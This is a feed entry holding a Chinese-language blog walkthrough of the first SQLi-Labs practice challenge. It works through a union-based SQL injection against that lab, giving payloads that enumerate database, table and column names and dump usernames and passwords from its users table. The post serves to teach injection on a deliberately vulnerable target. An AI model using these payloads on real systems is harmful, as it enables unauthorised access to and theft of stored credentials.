    <entry>
      <title>SQLi-LABS Basic Challenges</title>
      <link href="/2020/04/10/SQLi-LABS%20Basic%20Challenges/"/>
      <url>/2020/04/10/SQLi-LABS%20Basic%20Challenges/</url>
      
        <content type="html"><![CDATA[<p>SQL注入需要掌握一些基本的SQL语句及系统表信息。SQLi-Labs系列是学习SQL注入一个不错的靶场，使用<a href="https://hub.docker.com/r/acgpiano/sqli-labs" target="_blank" rel="noopener">sqli-labs</a>镜像可以快速搭建靶场环境。每个Less都有多种不同注入的方式，可以循序渐进的加深对SQL注入的了解。</p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><h2 id="UNION方式"><a href="#UNION方式" class="headerlink" title="UNION方式"></a>UNION方式</h2><div class="note info">            <p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>          </div><p>在页面提示下，传递id参数，输入<code>index.php？id=1</code>:</p><p><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_point.gif"  alt="less-1-injection-point"></p><p>输入<code>index.php?id=1&#39;</code> ，页面报错:<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code>,由此推断出源码的SQL语句可能是<code>select ... from ... where id=${id} limit 0,1</code>:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_limit.gif"  alt="less-1-limit"></p><p>使用union确认查询字段数量<code>index.php?id=1&#39; union select 1,2,3... -- d</code>,此处的<code>-- d</code>用于注释掉where条件后的<code>limit 0,1</code>，最终匹配到字段个数为3;<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_union_columns.gif"  alt="less-1-union"></p><div class="note info">            <p>数据库信息</p>          </div><p>使用<code>index.php?id=0&#39; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA -- dd</code>获取数据库名,此处<code>id=0</code>是为了显示后方查询结果：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-database.png"  alt="less-1-database"></p><div class="note info">            <p>表信息</p>          </div><p>使用<code>union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#39;security&#39; -- dd</code> 获取表:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-tables.png"  alt="less-1-tables"></p><div class="note info">            <p>字段信息</p>          </div><p>使用<code>union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_NAME=&#39;users&#39; -- dd</code>获取字段名:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-columns.png"  alt="less-1-columns"></p><div class="note info">            <p>表数据</p>          </div><p>使用 <code>index.php?id=0&#39; union select  1,group_concat(username),group_concat(password) from security.users   -- dd</code> 获取数据：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-data.png"  alt="less-1-data"></p>]]></content>
      
      
